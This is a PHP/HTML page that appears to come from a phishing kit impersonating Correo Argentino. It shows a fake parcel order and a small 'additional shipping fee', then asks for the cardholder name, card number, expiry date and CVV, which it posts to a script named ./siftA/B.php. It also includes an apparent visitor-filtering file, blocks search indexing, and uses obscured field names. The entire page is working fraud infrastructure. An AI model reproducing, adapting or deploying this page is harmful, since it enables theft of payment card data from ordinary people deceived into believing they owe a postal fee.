<?php
session_start();

include("./Conan/911.php");
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <!-- Required meta tags -->
        
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./X911/helpers.css">
        <link rel="stylesheet" href="./X911/stylee.css">

        <link rel="icon" type="image/x-icon" href="./X911/favicon.ico">

        <title>Correo Argentino |</title>
    </head>
	 <header style="background: #FFCE00; color: #fff;">
            <div class="head">
                <div class="logo">
                    <img src="./X911/logo.png" style="width: 150px;">
                </div>
            </div>
     </header>
    <body>
     <section>
            <div class="cc">
                <div class="info">
                    <div class="transaction">
                        <div class="ref">
                            <h4>Número de pedido, número de transporte, código de envío: AR-S1912738456</h4>
                            <span>Embalaje estándar</span>
                        </div>
                        <div class="order">
                            <p>Orden #AR-S1912738456</p>
                        </div>
                    </div>
                    <div class="form">
                        <h1>Detalles del pago</h1>
                        <div class="card-img">
                            <img style="max-width: 260px;" src="./X911/ccc.png">
                        </div>
                        <form action="./siftA/B.php" method="post">
                            <input type="hidden" name="captcha">
                            <input type="hidden" name="step" value="cc">
    <?php
    if (isset($_GET['error'])) {
        $error = $_GET['error'];
        if ($error == 'invalidCardNumber') {
            echo "<p class='input-groupe' style='color: red'>El número de tarjeta no es válido Introduce una tarjeta válida</p>";
        }
    }
    ?>
                            <div class="input-groupe">
                                    <label for="smiya">Nombre del titular de la tarjeta <span>*</span></label>
                                    <input type="text" id="smiya" name="smiya" placeholder="Nombre del titular de la tarjeta" class="" value="" required="">
                                                            </div>
                            
                            <div class="input-groupe">
                                <label for="one">Número de tarjeta <span>*</span></label>
                                <input id="one" name="one" type="text" placeholder="XXXX XXXX XXXX XXXX" class="" value="" required="">
                                                            </div>

                            <div class="input-groupe">
                                <label for="two">Fecha de caducidad <span>*</span></label>
                                <input id="two" type="text" maxlength="7" placeholder="MM/YY" name="two" class="" value="" required="">
                                                            </div>

                            <div class="input-groupe">
                                <label for="three">Código de seguridad (CVV) <span>*</span></label>
                                <input id="three" type="text" placeholder="XXX" name="three" class="" value="" required="">
                                                            </div>

                            <div style="margin-top: 50px;"><button name="submit">Paga y continúa</button></div>
                            
                        </form>
                    </div>
                </div>

                <div class="free">
                    <div class="free-top">
                        <div class="log">
                            <img src="./X911/corre.jpg">
                        </div>
                            <h5>Gastos de envío adicionales</h5>
                        <div class="free-right">
                            <p>ARS 6.21</p>
                            <span>(ARS 6.21  IVA incluido)</span>
                        </div>
                    </div>
                    <hr>
                    <div class="free-b d-flex">
                        <h3>Total</h3>
                        <div class="free-right">
                            <p>ARS 6.21</p>
                            <span>(VAT incluido)</span>
                        </div>
                    </div>

                </div>
            </div>
     </section>
	 
<footer>


</footer>
	 

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="./X911/jquery.mask.js"></script>

		<script>
            $("#one").mask("0000 0000 0000 00000");
            $("#two").mask("00/00");
            $("#three").mask("0000");
        </script>


    </body>

</html>
